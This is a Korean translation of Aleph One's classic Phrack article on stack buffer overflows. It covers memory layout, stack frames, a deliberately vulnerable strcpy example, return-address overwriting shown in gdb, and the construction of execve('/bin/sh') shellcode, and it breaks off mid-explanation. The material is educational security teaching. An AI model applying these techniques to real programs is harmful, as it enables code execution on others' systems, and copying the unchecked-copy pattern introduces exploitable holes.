@@ -1,0 +1,1715 @@
+﻿Phrack Magazine  7권 49호 - 총 16중 14번째                          
+BugTraq, r00t, 그리고 Underground.Org 제공
+                                 
+
+                    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                    Smashing The Stack For Fun And Profit
+                     재미와 이득을 위한 스택 때려부수기
+                    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+저자 : Aleph One <aleph1@underground.org>
+번역 : 박상운 <greenray7@yahoo.co.kr>
+
+* 역자주 : 번역이 미흡한 것 같으니, 잘 못 번역된 곳이 있으면 꼭 멜 보내주세요.
+
+
+'스택 때려부수기(smash the stack)' [C 프로그래밍] : 많은 C 코드에서, 루틴에서 
+자동으로 선언된 배열보다 길게 씀으로써 실행 스택을 변경할 수 있다. 이런 일을 
+수행하는 코드를 스택을 때려부순다(smash the stack)라고 하며, 루틴에서 돌아와서 
+임의의 주소로 뛰어 넘어가게 할 수도 있다. 이것은 인류에게 알려진 버그들 중에서, 
+가장 함정에 빠지기 쉬운, 데이터에 의존적인 버그들을 일으킬 수 있다. 이것들은 
+스택 치우기(trash), 스택 갈겨쓰기(scribble), 스택 난도질하기(mangle)를 포함한다; 
+스택 개조하기(mung)란 말은 쓰이지 않는다. 왜냐하면 이것은 절대 고의적으로 되지
+않기 때문이다. spam을 보라;또한 alias 버그, 코어상의 유치한 짓, 메모리상의 결함, 
+우위의 분실(precedence lossage), overrun screw도 보라.
+
+                                소개
+                               ~~~~~~
+
+지난 몇 달동안, 발견되고 또 이용된 버퍼 오버플로우 취약점들이 매우 많이 늘어났다.
+예를 들면, syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD 마운트, Xtlibrary 등등
+말이다. 이 글은 버퍼 오버플로우란 것이 무엇인지, 그리고 어떻게 이용해 먹는지를
+설명할 것이다.
+
+어셈블리에 관한 기본적인 지식은 갖추고 있어야 한다. 가상 메모리의 개념에 대한 이해와
+gdb 사용 경험은 매우 도움을 줄것이지만, 꼭 필수는 아니다. 우리는 또한 우리가 Intel x86
+CPU로 작업하고 있으며 운영체계는 리눅스라는 것을 전제로 한다.
+
+시작하기 전 몇가지 기초 정의 : 버퍼는, 같은 데이터 형으로 된 다중의 인스턴스를 
+담고 있는, 컴퓨터 메모리의 연속된 블럭을 뜻한다. C 프로그래머들은 보통 워드 버퍼
+배열을 연상한다. 가장 흔하게는 문자 배열을 관련시켜 생각한다. C에서의 모든 변수들과 
+같이, 배열은 정적 혹은 동적으로 선언될 수 있다. 정적인 변수들은 프로그램이 로드될 때 
+데이터 부분(data segment)에 할당된다. 동적인 변수들은 실행중에 스택에 할당된다. 
+오버플로우라는 것은 꼭대기나 가장자리, 혹은 경계를 넘어서 넘쳐 흐르거나 넘치도록 
+채우는 것을 뜻한다. 우리는 스택을 기반으로 한 버퍼 오버플로우로 알려진, 동적인 버퍼들의 
+오버플로우만을 다룰 것이다.
+
+                          프로세스 메모리의 구조
+                         ~~~~~~~~~~~~~~~~~~~~~~~~
+
+스택 버퍼란 것이 무엇인지 이해하기 위해서는, 우리는 메모리에서 프로세스가
+어떻게 이루어졌는가를 먼저 이해해야 한다. 프로세스들은 3가지 지역으로 나뉜다:
+텍스트(text), 데이터, 그리고 스택(stack). 우리는 스택 지역에 집중할 것이지만,
+먼저 순서대로 다른 지역들도 약간 살펴볼 것이다.
+
+Text 지역은 프로그램에 의해 고정되어 있다. 그리고 명령코드(명령)와 읽기 전용인
+데이터를 포함하고 있다. 이 지역은 실행파일의 Text부분에 해당한다. 이 지역은 보통 읽기 
+전용으로 되어 있으며, 그것에 기록하려 한다면 지역침입 에러(segmentation violation)가 
+발생할 것이다.
+
+데이터 지역은 초기화된 것과 초기화되지 않은 데이터를 포함하고 있다. 정적인 변수들은
+이 지역에 저장되어 있다. 데이터 지역은 실행파일의 data-bss 지역에 해당한다. 그것의 
+크기는 brk(2) 시스템 호출로 바뀔 수 있다. 만약 bss데이터나 사용자 스택이 늘어나서
+사용가능한 메모리를 다 써버린다면, 프로세스는 가로막혀지고, 더 큰 메모리 공간에서
+다시 실행하도록 다시 계획된다. 새로운 메모리는 데이터 지역과 스택 지역사이에 추가
+된다.
+
+                            /------------------\  낮은
+                            |                  |  메모리
+                            |       Text       |  주소
+                            |                  |
+                            |------------------|
+                            |    (초기화 됨)   |
+                            |       Data       |
+                            |   (초기화 안됨)  |
+                            |------------------|
+                            |                  |
+                            |       Stack      |  높은
+                            |                  |  메모리
+                            \------------------/  주소
+
+                        그림. 1 프로세스 메모리 지역들
+
+
+                              스택이란 무엇인가?
+                             ~~~~~~~~~~~~~~~~~~~~
+
+스택은 컴퓨터 과학에서 자주 사용되는 추상적인 테이터 형이다. 스택은 스택상에서
+가장 끝에 자리잡고 있는 객체가 가장 먼저 제거되는 객체가 되는 특징을 가지고 있다. 
+이 특성은 보통 "가장 나중에 들어온 것이, 가장 먼저 나간다" 또는 LIFO로 불려진다.
+
+스택 상에서는 몇가지 명령이 정의되어 있다. 가장 중요한 2가지는 밀어넣기(PUSH)와 
+꺼내기(POP)이다. PUSH는 스택의 꼭대기에 원소 1개를 추가한다. POP은 그 반대로
+스택의 꼭대기에 있는 가장 마지막의 원소를 제거함으로써 스택의 크기를 한 원소만큼
+감소시킨다.
+
+
+                            우리는 왜 스택을 사용하는가?
+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+현대의 컴퓨터들은 고급언어들의 필요에 따라 설계되었다. 고급언어로 프로그램들을 
+구성하는데 가장 중요한 기술은 프로시저나 함수이다. 어떤 시점에서 보면, 프로시저
+호출은 jump명령이 그러하듯이 제어의 흐름을 변경하지만, jump와는 다르게 그것의
+작업을 끝낸 후에는, 호출명령 다음에 따르는 진술이나 명령에 제어를 되돌려 준다. 
+이 고급의 추상적 개념은 스택의 도움으로 가능하다.
+
+스택은 또한 함수내에서 지역변수들을 동적으로 할당하거나, 함수에 인자들을 넘기거나,
+함수로부터 값을 되돌려 줄 때 사용된다.
+
+
+                               스택 지역
+                              ~~~~~~~~~~~
+
+스택은 데이터를 포함하고 있는 메모리의 연속된 블럭이다. 스택 포인터(SP)라고 불리우는
+레지스터는 스택의 꼭대기를 가리킨다. 스택의 밑바닥은 고정된 주소에 있다. 그것의 크기는
+실행도중에 커널에 의해 동적으로 조절된다. CPU는 스택에 밀어넣고(PUSH) 꺼내는(POP)
+명령들을 수행한다.
+
+스택은 함수가 호출될때 push되고, 되돌아올때 pop되는 논리적인 스택 프레임으로 이루어 
+졌다. 스택 프레임은 함수에 전달되는 인자들, 함수의 지역 변수들, 그리고 함수 호출시의
+명령 포인터(instruction pointer)의 값을 포함한, 바로 전 스택 프레임을 복구하기 위한 데이터
+를 포함한다.
+
+이행에 의존하여, 스택은 아래로 뻗어가거나(낮은 메모리 주소를 향해) 위로 자랄것이다.
+우리 예제들에서는, 아래로 뻗어가는 스택을 사용할 것이다. 이것은 Intel,Motorola,SPARC
+그리고 MIPS 프로세서들을 포함한 많은 컴퓨터에서 스택이 뻗어가는 방법이다. 스택포인터
+(SP)는 또한 이행에 의존적이다. 그것은 스택의 마지막 주소를 가리킬 수도 있고, 또는
+스택다음의 사용가능한 주소를 가리킬 수도 있다. 여기서는, 우리는 그것이 스택의 마지막
+주소를 가리킨다고 생각하자.
+
+스택 포인터에 덧붙여 말하자면, 스택 포인터는 스택의 꼭대기를 가리키는데(숫자적으로 
+가장 낮은 주소), 프레임 내에서 고정된 위치를 가리키는 프레임포인터(FP)를 가진다면 
+그것은 때때로 편리할 것이다. 어떤 문서들에서는 또한 그것을 지역 바닥 포인터(LB)라고 
+부른다. 원칙적으로, 지역 변수들은 SP로부터 떨어진 거리를 써서 참조될 수 있다. 하지만,
+데이터들이 스택에 push되고 pop되기 때문에, SP로부터의 거리(offset)는 변하기 마련이다.
+비록 어떤 경우에 있어서, 컴파일러는 스택상의 데이터들의 수를 기억함으로써 그 거리를
+정정하지만, 다른 경우에는 불가능할 뿐더러 모든 경우에, 고려하면서 관리해야 한다.
+게다가, Intel을 기반으로한 프로세서같은 것에서는, SP로부터의 거리를 안다고 해도,
+그 변수에 접근하는 것은 다중의 명령을 필요로 한다.
+
+결론적으로, 많은 컴파일러들이 두 번째 레지스터, 즉 FP를 지역변수와 인자 모두를
+참조하는데 사용한다. 왜냐하면 FP로부터의 거리는 PUSH와 POP명령으로 인해
+변하지 않기 때문이다. Intel CPU에서는, BP (EBP)가 이런 목적으로 쓰인다. Motorola 
+CPU에서는 스택 포인터인 A7만 제외하고 어떤 주소 레지스터도 이 일을 할 수 있을 것이다.
+스택이 뻗어가는 방법때문에, 실제 인자들은 FP로부터의 거리(offset)가 양수이고,
+지역변수들은 FP로부터의 거리(offset)가 음수이다.
+
+프로시저가 호출되었을 때, 프로시저가 가장 먼저 해야 할 일은 바로 전의 FP를 저장하는
+것이다(프로시저가 종료될때, 원래값을 되돌려 주기 위해). 그런다음 그것은 새로운 FP를
+만들기 위해, SP를 FP로 복사한다. 그리고 지역변수들을 위한 공간을 예약하기 위해 SP를
+전진시킨다. 이 코드는 프로시저의 도입부(prolog)라고 불린다. 프로시저가 종료될때, 스택은
+다시 깔끔하게 청소되어야 하는데, 이것을 프로시저의 결말(epilog)이라고 부른다. Intel의 
+ENTER와 LEAVE 명령들과 Motorola의 LINK와 UNLINK 명령들은 프로시저의 프롤로그와
+에필로그의 대부분을 효과적으로 하기 위해 제공된다.
+  
+ 짧은 예에서 스택이 어떠한 모양을 갖추고 있는지 살펴보자:
+
+
+example1.c:
+------------------------------------------------------------------------------
+void function(int a, int b, int c) {
+  char buffer1[5];
+  char buffer2[10];
+}
+
+void main() {
+ function(1,2,3);
+}
+------------------------------------------------------------------------------
+
+프로그램이 function()함수를 부르기 위해 무엇을 하는지를 이해하기 위해, 어셈블리 코드를
+생성시키기 위해서는 -S 옵션을 사용하여 gcc로 컴파일한다:
+
+ $ gcc -S -o example1.s example1.c
+ 
+
+ 어셈블리어 출력물을 봄으로써, 우리는 function()을 호출하는 것이 다음과 같이
+번역된다는 것을 알 수 있다:
+
+       pushl $3
+       pushl $2
+       pushl $1
+       call function
+
+ 이것은 함수에 대한 3개의 인자들을 스택에 반대순서(3,2,1)로 밀어 넣는다. 그리고 
+function()을 호출한다. 'call' 명령은 명령 포인터(IP)를 스택에 밀어 넣을(push) 것이다. 
+우리는 이 저장된 IP를 복귀 주소(RET)라고 부를 것이다. 함수안에서 가장 먼저 처리되는
+것은 프로시저 프롤로그이다:
+
+       pushl %ebp
+       movl %esp,%ebp
+       subl $20,%esp
+
+이것은 프레임 포인터인 EBP를 스택에 밀어 넣는다. 그런다음 EBP를 새로운 FP포인터로
+만들기 위해 현재의 SP를 EBP에 복사한다. 우리는 이 저장된 FP를 SFP라고 부를 것이다. 
+그런다음 지역 변수들의 크기만큼 SP를 감소시킴으로써 지역 변수들을 위해 공간을 할당한다. 
+
+우리는, 메모리가 워드 크기의 배수만큼만 지정될 수 있다는 것을 기억해야 한다.
+우리의 경우에 한 워드는 4바이트, 즉 32비트이다. 그러므로 5바이트의 버퍼는 실제로는
+8바이트(2워드)만큼의 메모리를 차지할 것이고 10바이트의 버퍼는 12바이트(3워드)만큼
+의 메모리를 차지할 것이다. 그게 바로 SP가 20만큼 감소되는 이유이다. 이것을 명심하고
+function()함수가 호출될 때 스택이 어떤 모습을 하고 있을지 살펴보자(각각의 1칸은 
+1바이트를 나타낸다):
+
+
+메모리의                                                            메모리의
+아래쪽                                                                 위쪽
+          buffer2       buffer1   sfp   ret   a     b     c
+<------   [            ][        ][    ][    ][    ][    ][    ]
+              
+스택의                                                              스택의
+  위쪽                                                              아래쪽
+
+
+                               버퍼 오버플로우
+                              ~~~~~~~~~~~~~~~~~
+
+버퍼 오버플로우는 버퍼가 다룰 수 있는 것보다 더 많은 데이터를 버퍼에 채움으로써
+일어난다. 이렇게 자주 발견되는 프로그래밍 에러가 임의의 코드를 실행하는데 어떻게
+사용되어 질 수 있는가? 다른 예를 한 번 살펴보자:
+
+
+example2.c
+------------------------------------------------------------------------------
+void function(char *str) {
+  char buffer[16];
+
+  strcpy(buffer,str);
+}
+
+void main() {
+ char large_string[256];
+ int i;
+
+ for( i = 0; i < 255; i++)
+   large_string[i] = 'A';
+
+ function(large_string);
+}
+------------------------------------------------------------------------------
+
+이 프로그램에는 전형적인 버퍼 오버플로우 코딩 에러를 포함한 함수가 있다.
+그 함수는 문자열 길이를 확인(bounds checking)하지 않고, strncpy() 함수 대신에 
+strcpy() 함수를 사용하여 주어진 문자열을 복사한다. 만약 여러분이 이 프로그램을
+실행시킨다면, 지역침입 에러(segmentation violation)가 발생할 것이다.
+우리가 함수를 부를 때, 스택이 어떤 모습을 하고 있는지 살펴보자:
+
+
+
+메모리의                                                         메모리의
+아래쪽                                                            위쪽
+                 buffer            sfp   ret   *str
+<------          [                ][    ][    ][    ]
+
+스택의                                                          스택의
+ 위쪽                                                           아래쪽
+
+
+여기서 무슨일이 벌어지는가? 왜 지역침입 에러(segmentation violation)가 발생하는가?
+간단하다. strcpy()함수는 문자열에서 널문자가 발견될때까지, *str(larger_string[])의 내용을
+buffer[]로 복사한다. 우리도 볼 수 있듯이, buffer[]는 *str보다 훨씬 작다. buffer[]는 16바이트
+길이지만, 우리는 그것을 256바이트로 채우려고 한다. 이것은 스택에 있는 buffer뒤의 240
+바이트가 모두 덮여 쓰여진다는 것을 의미한다. 이것은 SFP, RET 그리고 심지어 *str까지도
+포함한다. 우리는 large_string을 문자 'A'로 채웠었다. 그것의 16진수 문자 값은 0x41이다.
+이것은 복귀주소(RET)가 이제 0x41414141이라는 것을 의미한다. 이 주소는 프로세스 
+주소공간 바깥에 있다. 그게 바로 함수가 복귀된 후, 그 주소로부터 다음 명령을 읽으려고
+할때, 지역침입 에러(segmentation violation)가 발생하는 이유이다.
+
+* 역자주 : 위의 240바이트는 원문에서는 250바이트로 되어 있었으나, 잘못된 것 같아서 240
+              으로 수정했습니다.
+
+그러므로, 버퍼 오버플로우는 우리가 함수의 복귀주소(RET)를 바꿀 수 있도록 해 준다.
+이 방법으로, 우리는 프로그램의 실행흐름을 변경할 수 있다. 첫 번째 예제로 돌아가서
+스택이 어떤 모양을 하고 있었는지 기억을 되살려 보자:
+
+메모리의                                                            메모리의
+아래쪽                                                                 위쪽
+          buffer2       buffer1   sfp   ret   a     b     c
+<------   [            ][        ][    ][    ][    ][    ][    ]
+              
+스택의                                                              스택의
+  위쪽                                                              아래쪽
+
+우리의 첫번째 예제를 수정해서 그것이 복귀주소(RET)를 덮어 쓰도록하자. 그리고
+우리가 어떻게 그것이 임의의 코드를 실행하도록 만들 수 있는지 설명해 보자. SFP는
+스택에 있는 buffer1[]의 바로 앞에 있다. 그리고 SFP 앞에는 복귀주소(RET)가 있다.
+buffer1[]의 끝을 지나는 것은 4바이트이다. 하지만 buffer1[]은 실제로는 2워드 즉 
+8바이트라는 것을 기억해라. 함수 호출이 된 후에, 우리는 대입식인 'x=1;'과 같은 
+방법으로 복귀값을 수정할 것이다. 그렇게 하기 위해서는 우리는 복귀주소(RET)에 
+8바이트를 더해야 한다. 코드는 여기 있다:
+
+
+example3.c:
+------------------------------------------------------------------------------
+void function(int a, int b, int c) {
+  char buffer1[5];
+  char buffer2[10];
+  int *ret;
+
+  ret = buffer1 + 12;
+  (*ret) += 8;
+}
+
+void main() {
+ int x;
+
+ x = 0;
+ function(1,2,3);
+ x = 1;
+ printf("%d\n",x);
+}
+------------------------------------------------------------------------------
+
+우리가 한 일은 buffer1[]의 주소에 12를 더한 것이다. 이 새로운 주소는 복귀주소(RET)가
+저장된 곳이다. 우리는 할당식을 뛰어넘어 printf함수 호출로 넘어가기를 원한다. 우리는
+어떻게 복귀주소(RET)에 8바이트를 더할 것을 알았는가? 우리는 먼저 시험값을 사용했고
+(예제 1을 위해), 프로그램을 컴파일한 후에 gdb를 시작했다.
+
+------------------------------------------------------------------------------
+[aleph1]$ gdb example3
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(no debugging symbols found)...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000490 <main>:       pushl  %ebp
+0x8000491 <main+1>:     movl   %esp,%ebp
+0x8000493 <main+3>:     subl   $0x4,%esp
+0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
+0x800049d <main+13>:    pushl  $0x3
+0x800049f <main+15>:    pushl  $0x2
+0x80004a1 <main+17>:    pushl  $0x1
+0x80004a3 <main+19>:    call   0x8000470 <function>
+0x80004a8 <main+24>:    addl   $0xc,%esp
+0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)
+0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax
+0x80004b5 <main+37>:    pushl  %eax
+0x80004b6 <main+38>:    pushl  $0x80004f8
+0x80004bb <main+43>:    call   0x8000378 <printf>
+0x80004c0 <main+48>:    addl   $0x8,%esp
+0x80004c3 <main+51>:    movl   %ebp,%esp
+0x80004c5 <main+53>:    popl   %ebp
+0x80004c6 <main+54>:    ret
+0x80004c7 <main+55>:    nop
+------------------------------------------------------------------------------
+
+function()함수를 호출할때, RET는 0x80004a8이 될것이라는 것을 알 수 있다. 그리고
+우리는 0x80004ab에 있는 할당식을 뛰어 넘어가기를 원한다. 우리가 실행하기를 원하는
+다음 명령은 0x80004b2에 있다. 잠깐만 계산해 보면 거리가 8바이트라는 것을 알 수 있다.
+
+
+                                  쉘코드
+                                 ~~~~~~~~
+
+이제 우리는 복귀주소(RET)와 실행의 흐름을 수정할 수 있다는 사실을 알고 있다.
+하지만 우리는 어떤 프로그램을 실행시키기를 원하는가? 대부분의 경우에, 우리는
+프로그램이 쉘을 띄우기를 원한다. 그러면 쉘로부터 우리는 우리가 원하는 다른 
+명령들도 실행할 수 있다. 하지만 우리가 이용하고자 하는 프로그램안에 그런 코드가
+있지 않다면? 어떻게 우리는 임의의 명령을 그것의 주소공간에 위치시킬 것인가?
+해답은 우리가 실행하기를 원하는 코드를, 오버플로우되고 있는 버퍼에 위치시키고
+복귀주소(RET)가 다시 그 버퍼를 가리키도록 RET를 덮어쓰는 것이다. 스택이 주소
+0xFF에서 시작하며 S는 우리가 실행하기를 원하는 코드를 뜻한다고 생각하면서,
+스택이 어떤 모양을 하고 있을지 살펴보자:
+
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+          buffer                sfp   ret   a     b     c
+
+<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
+          ^                            |
+          |____________________________|
+top of                                                            bottom of
+stack                                                                 stack
+
+
+C 에서 쉘을 실행시키기 위한 코드는 다음과 같다:
+
+shellcode.c
+-----------------------------------------------------------------------------
+#include <stdio.h>
+
+void main() {
+  char *name[2];
+
+  name[0] = "/bin/sh";
+  name[1] = NULL;
+  execve(name[0], name, NULL);
+}
+------------------------------------------------------------------------------
+
+ 위의 것이 어셈블리로는 어떻게 표현되는 지를 알기 위해서는, 그것을 컴파일한 후 gdb를 
+시작해야 한다. -static 플래그를 쓰는 것을 기억해라. 그렇지 않으면 execve 시스템 호출에
+해당하는 실제 코드는 포함되지 않을 것이다. 대신에 보통 프로그램이 로드될 때 연결되는 
+동적인 C 라이브러리를 참조할 것이다.
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
+[aleph1]$ gdb shellcode
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     subl   $0x8,%esp
+0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x8000144 <main+20>:    pushl  $0x0
+0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+0x8000149 <main+25>:    pushl  %eax
+0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+0x800014d <main+29>:    pushl  %eax
+0x800014e <main+30>:    call   0x80002bc <__execve>
+0x8000153 <main+35>:    addl   $0xc,%esp
+0x8000156 <main+38>:    movl   %ebp,%esp
+0x8000158 <main+40>:    popl   %ebp
+0x8000159 <main+41>:    ret
+End of assembler dump.
+(gdb) disassemble __execve
+Dump of assembler code for function __execve:
+0x80002bc <__execve>:   pushl  %ebp
+0x80002bd <__execve+1>: movl   %esp,%ebp
+0x80002bf <__execve+3>: pushl  %ebx
+0x80002c0 <__execve+4>: movl   $0xb,%eax
+0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+0x80002ce <__execve+18>:        int    $0x80
+0x80002d0 <__execve+20>:        movl   %eax,%edx
+0x80002d2 <__execve+22>:        testl  %edx,%edx
+0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
+0x80002d6 <__execve+26>:        negl   %edx
+0x80002d8 <__execve+28>:        pushl  %edx
+0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
+0x80002de <__execve+34>:        popl   %edx
+0x80002df <__execve+35>:        movl   %edx,(%eax)
+0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
+0x80002e6 <__execve+42>:        popl   %ebx
+0x80002e7 <__execve+43>:        movl   %ebp,%esp
+0x80002e9 <__execve+45>:        popl   %ebp
+0x80002ea <__execve+46>:        ret
+0x80002eb <__execve+47>:        nop
+End of assembler dump.
+------------------------------------------------------------------------------
+
+여기서 무슨일이 일어나는지 이해하도록 하자. 먼저 main함수를 알아보며 시작하자:
+
+------------------------------------------------------------------------------
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     subl   $0x8,%esp
+
+           이것은 프로시저 도입부이다. 그것은 먼저 예전의 프레임 포인터를 저장하고,
+           현재의 스택 포인터를 새로운 프레임 포인터로 만든다. 그리고 지역변수들을
+           위한 공간을 남겨둔다. 이 경우 그것은:
+
+           char *name[2];
+
+           즉, char데이터형을 가리키는 2개의 포인터이다. 포인터는 길이가 
+           1 워드이므로, 그것은 2워드(8바이트)를 위한 공간을 남겨둔다.
+
+0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+
+           우리는 0x80027b8 (문자열인 "/bin/sh"의 주소)값을 name[]의 첫번째
+           포인터에 복사한다. 이것은 다음에 해당한다:
+
+           name[0] = "/bin/sh";
+
+0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+           우리는 0x0값(NULL)을 name[]의 두번째 포인터에 복사한다.
+           이것은 다음에 해당한다:
+
+           name[1] = NULL;
+
+           execve() 함수의 실제 호출은 여기서 시작한다.
+
+0x8000144 <main+20>:    pushl  $0x0
+
+           execve()의 인자들을 스택에 반대순서로 밀어넣는다.
+           NULL로 시작한다.
+
+0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+
+           name[]의 주소를 EAX레지스터로 불러들인다.
+
+0x8000149 <main+25>:    pushl  %eax
+
+           name[]의 주소를 스택에 밀어 넣는다.
+
+0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+
+           문자열인 "/bin/sh"의 주소를 EAX레지스터로 불러들인다.
+
+0x800014d <main+29>:    pushl  %eax
+
+           문자열인 "/bin/sh"의 주소를 스택에 밀어 넣는다.
+
+0x800014e <main+30>:    call   0x80002bc <__execve>
+
+           라이브러리 프로시저인 execve()를 호출한다. call명령은 IP를 스택에
+           밀어 넣는다.
+------------------------------------------------------------------------------
+
+이제 execve()를 할 차례다. 우리는 Intel기반 리눅스 시스템을 사용하고 있다는 것을 명심해라.
+시스템 호출의 세부사항은 OS와 CPU에 따라서 달라질 것이다. 어떤 것은 인자들을 스택으로
+넘기는 한편, 다른 것은 레지스터로 넘긴다. 어떤 것은 커널모드로 넘어가기 위해서 소프트웨어
+인터럽트를 사용하지만, 다른 것은 far 호출을 사용한다. 리눅스는 시스템 호출의 인자들을
+레지스터로 넘기고, 커널모드로 넘어가기 위해서 소프트웨어 인터럽트를 사용한다.
+
+------------------------------------------------------------------------------
+0x80002bc <__execve>:   pushl  %ebp
+0x80002bd <__execve+1>: movl   %esp,%ebp
+0x80002bf <__execve+3>: pushl  %ebx
+
+           프로시저 도입부.
+
+0x80002c0 <__execve+4>: movl   $0xb,%eax
+
+           0xb(10진수로 11)을 스택에 복사한다. 이것은 시스템 호출 목록의
+           색인이다. 11은 execve를 뜻한다.
+
+0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+
+           "/bin/sh"의 주소를 EBX로 복사한다.
+
+0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+
+           name[]의 주소를 ECX로 복사한다.
+
+0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+
+           null 포인터의 주소를 EDX로 복사한다.
+
+0x80002ce <__execve+18>:        int    $0x80
+
+           커널모드로 바꾼다.
+------------------------------------------------------------------------------
+
+execve() 시스템 호출에 그리 많은 것이 있지 않다는 것을 알 수 있다. 우리가 해야하는
+전부는 다음과 같다:
+
+           a) null문자로 종료되는 문자열 "/bin/sh"을 메모리의 어딘가에 위치시킨다.
+           b) 워드길이의 null이 뒤따르는, "/bin/sh"문자열의 주소를 메모리의 어딘가에
+              위치시킨다.
+           c) 0xb를 EAX 레지스터에 복사한다.
+           d) 문자열 "/bin/sh"의 주소의 주소를 EBX 레지스터에 복사한다.
+           e) 문자열 "/bin/sh"의 주소를 ECX 레지스터에 복사한다.
+           f) 워드길이의 null의 주소를 EDX 레지스터에 복사한다.
+           g) int $0x80 명령을 실행한다.
+
+하지만 execve() 호출이 어떤 이유로 인해 실패한다면? 프로그램은 임의의 데이터를
+포함하고 있을지 모르는 스택으로부터 계속해서 명령을 읽어 들일 것이다. 프로그램은
+대부분 코어 덤프를 일으킬 것이다. 만약 execve 시스템 호출이 실패한다면, 우리는 
+프로그램이 깨끗하게 종료되기를 원한다. 이것을 성취하기 위해서는, 우리는 execve
+시스템 호출 다음에 exit 시스템 호출을 추가해야 한다. exit 시스템 호출은 어떤 모양을
+하고 있는가?
+
+exit.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+void main() {
+       exit(0);
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o exit -static exit.c
+[aleph1]$ gdb exit
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(no debugging symbols found)...
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x800034c <_exit>:      pushl  %ebp
+0x800034d <_exit+1>:    movl   %esp,%ebp
+0x800034f <_exit+3>:    pushl  %ebx
+0x8000350 <_exit+4>:    movl   $0x1,%eax
+0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
+0x8000358 <_exit+12>:   int    $0x80
+0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
+0x800035d <_exit+17>:   movl   %ebp,%esp
+0x800035f <_exit+19>:   popl   %ebp
+0x8000360 <_exit+20>:   ret
+0x8000361 <_exit+21>:   nop
+0x8000362 <_exit+22>:   nop
+0x8000363 <_exit+23>:   nop
+End of assembler dump.
+------------------------------------------------------------------------------
+
+exit 시스템 호출은 0x1을 EAX에 위치시키고, exit 코드를 EBX에 위치시키고
+"int $0x80"을 실행할 것이다. 바로 그거다. 대부분의 응용 프로그램들은 아무런 
+에러가 없었다고 알리기 위해 종료시에 0을 반환한다. 우리는 EBX에 0을 위치
+시킬 것이다. 순서리스트는 다음과 같다:
+
+           a) null문자로 종료되는 문자열 "/bin/sh"을 메모리의 어딘가에 위치시킨다.
+           b) 워드길이의 null이 뒤따르는, "/bin/sh"문자열의 주소를 메모리의 어딘가에
+              위치시킨다.
+           c) 0xb를 EAX 레지스터에 복사한다.
+           d) 문자열 "/bin/sh"의 주소의 주소를 EBX 레지스터에 복사한다.
+           e) 문자열 "/bin/sh"의 주소를 ECX 레지스터에 복사한다.
+           f) 워드길이의 null의 주소를 EDX 레지스터에 복사한다.
+           g) int $0x80 명령을 실행한다.
+           h) 0x1을 EAX 레지스터에 복사한다.
+           i) 0x0을 EBX 레지스터에 복사한다.
+           j) int $0x80 명령을 실행한다.
+
+
+이것을 어셈블리어로 조합하려고 하면서, 문자열을 코드다음에 위치시키면서,
+그리고 문자열의 주소와 null워드를 배열다음에 위치시킬 것을 기억하면 이렇게
+된다:
+------------------------------------------------------------------------------
+       movl   string_addr,string_addr_addr
+       movb  $0x0,null_byte_addr
+       movl   $0x0,null_addr
+       movl   $0xb,%eax
+       movl   string_addr,%ebx
+       leal   string_addr,%ecx
+       leal   null_string,%edx
+       int    $0x80
+       movl   $0x1, %eax
+       movl   $0x0, %ebx
+           int    $0x80
+       /bin/sh string goes here.
+------------------------------------------------------------------------------
+
+문제는 우리가 코드(그리고 그것을 뒤따르는 문자열)를 이용하고자 하는 프로그램의 
+메모리 공간이 어디가 될지 모른다는 것이다. 그것을 해결하는 한 방법은 JMP와 CALL
